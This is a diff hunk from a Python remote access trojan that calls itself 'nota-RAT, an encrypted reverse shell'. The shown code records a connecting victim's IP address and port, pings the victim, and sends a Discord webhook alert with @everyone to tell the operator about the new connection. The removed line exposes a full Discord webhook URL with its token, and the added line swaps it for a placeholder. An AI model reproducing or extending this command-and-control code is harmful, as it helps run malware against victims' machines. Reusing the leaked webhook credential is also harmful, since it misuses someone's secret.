@@ -47,7 +47,7 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 
 response_list = ping(f'{client_address[0]}', size=40, count=10)
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1036935355934453790/32ktylVPdphVHLh3WH-73VQrZqKtkPf-pf-7sDv-YnBWRF2D9CpMoHkIiItES-jm4J91', content='@everyone')
+webhook = DiscordWebhook(url='discord web token', content='@everyone')
 embed = DiscordEmbed(title='nota-RAT', description='an encrypted reverse shell', color='03b2f8')
 embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
 embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
